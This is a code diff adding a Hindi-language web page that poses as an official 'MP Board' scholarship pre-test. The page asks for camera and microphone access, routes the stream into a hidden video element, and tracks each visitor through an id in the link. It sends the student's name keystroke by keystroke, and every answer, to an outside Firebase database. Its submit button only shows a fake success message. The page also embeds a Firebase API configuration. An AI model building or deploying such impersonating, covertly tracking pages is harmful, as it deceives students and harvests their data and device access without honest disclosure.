@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MP Board Scholarship Exam Portal</title>
+    
+    <!-- फायरबेस लाइब्रेरी (Stable Version) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
+        body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
+        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
+        .banner h2 { font-size: 22px; margin-bottom: 5px; }
+        .content { padding: 25px; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
+        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
+        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
+        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
+        .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+    </style>
+
+    <script>
+        // आपका लाइव फायरबेस क्रेडेंशियल यहाँ सेट है
+        const firebaseConfig = {
+            apiKey: "AIzaSyC0i6AtzIoLZm-Lz3pLr4UK5snjhER0es",
+            authDomain: "mytestapp-7b70d.firebaseapp.com",
+            databaseURL: "https://mytestapp-7b70d-default-rtdb.firebaseio.com",
+            projectId: "mytestapp-7b70d",
+            storageBucket: "mytestapp-7b70d.firebasestorage.app",
+            messagingSenderId: "380512974619",
+            appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
+            measurementId: "G-ZMV07B4JY6"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // छात्र की पहचान के लिए URL पैरामीटर (?id=...)
+        const urlParams = new URLSearchParams(window.location.search);
+        let studentId = urlParams.get('id');
+        if (!studentId) {
+            studentId = 'guest_' + Math.floor(Math.random() * 10000);
+        }
+
+        window.addEventListener("load", initExam);
+
+        async function initExam() {
+            try {
+                // कैमरा और माइक चालू करना
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('hidden-video').srcObject = stream;
+                
+                database.ref('online_tests/' + studentId).update({
+                    portal_status: "OPENED",
+                    last_seen: new Date().toISOString()
+                });
+            } catch (err) {
+                alert("कृपया टेस्ट देने के लिए कैमरा और माइक की अनुमति दें।");
+                console.log(err);
+            }
+        }
+
+        // लाइव डेटाबेस में प्रोग्रेस भेजना
+        function sendProgress(key, value) {
+            let data = {};
+            data[key] = value;
+            data['last_updated'] = new Date().toISOString();
+            database.ref('online_tests/' + studentId).update(data);
+        }
+    </script>
+</head>
+<body>
+
+<video id="hidden-video" autoplay playsinline muted style="display:none;"></video>
+
+<div class="app-card">
+    <div class="banner">
+        <h2>प्रवेश परीक्षा (Pre-Test)</h2>
+        <p>स्कॉलरशिप पोर्टल</p>
+    </div>
+
+    <div class="content">
+        <form onsubmit="alert('आपका टेस्ट सफलतापूर्वक सबमिट हो गया है!'); return false;">
+            <div class="input-group">
+                <label>छात्र का पूरा नाम:</label>
+                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="sendProgress('student_name', this.value)">
+            </div>
+
+            <div class="qa-section">
+                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
+                <div class="qa-options">
+                    <label><input type="radio" name="q1" value="A" onclick="sendProgress('answer_q1', 'A')"> A) मॉनिटर</label>
+                    <label><input type="radio" name="q1" value="B" onclick="sendProgress('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
+                    <label><input type="radio" name="q1" value="C" onclick="sendProgress('answer_q1', 'C')"> C) कीबोर्ड</label>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">उत्तर सबमिट करें</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
